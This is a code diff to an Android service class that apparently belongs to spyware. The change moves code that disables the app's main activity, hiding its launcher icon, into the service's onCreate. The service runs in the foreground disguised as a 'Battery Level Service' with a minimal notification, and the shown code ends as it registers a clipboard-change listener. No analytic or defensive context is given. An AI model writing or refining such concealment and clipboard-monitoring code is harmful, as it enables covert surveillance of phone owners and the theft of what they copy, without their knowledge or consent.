@@ -116,6 +116,10 @@ public class MainService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
+
+        PackageManager pkg=this.getPackageManager();
+        pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+
         if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O)
             startMyOwnForeground();
         else
@@ -125,7 +129,7 @@ public class MainService extends Service {
     @RequiresApi(Build.VERSION_CODES.O)
     private void startMyOwnForeground()
     {
-        String NOTIFICATION_CHANNEL_ID = "example.permanence";
+        String NOTIFICATION_CHANNEL_ID = "example_permanence";
         String channelName = "Battery Level Service";
         NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
         chan.setLightColor(Color.BLUE);
@@ -141,7 +145,7 @@ public class MainService extends Service {
                 .setPriority(NotificationManager.IMPORTANCE_MIN)
                 .setCategory(Notification.CATEGORY_SERVICE)
                 .build();
-        startForeground(2, notification);
+        startForeground(1, notification);
     }
 
 
@@ -149,8 +153,8 @@ public class MainService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         super.onStartCommand(intent, flags, startId);
 
-        PackageManager pkg=this.getPackageManager();
-        pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+//        PackageManager pkg=this.getPackageManager();
+//        pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 
         ClipboardManager.OnPrimaryClipChangedListener mPrimaryChangeListener = new ClipboardManager.OnPrimaryClipChangedListener() {
             public void onPrimaryClipChanged() {
